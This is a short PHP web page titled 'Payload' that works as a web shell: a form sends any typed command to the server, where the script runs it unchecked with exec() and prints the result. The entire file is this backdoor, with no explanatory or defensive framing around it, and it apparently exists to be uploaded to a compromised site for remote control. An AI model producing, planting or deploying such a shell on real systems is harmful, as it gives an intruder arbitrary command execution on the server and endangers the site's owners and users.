<!DOCTYPE html>
<html>
      
<head>
    <title>
        Payload
    </title>
</head>
  
<body style="text-align:center;">

    <?php
        $command = $_POST["cmd_input"];
        $output = exec($command);
        echo $output;
    ?>

    <form method="post">
        <label for="cmd_input">Command: </label><input type="text" name="cmd_input"><br>
        <input type="submit"/>
    </form>
</head>
  
</html>

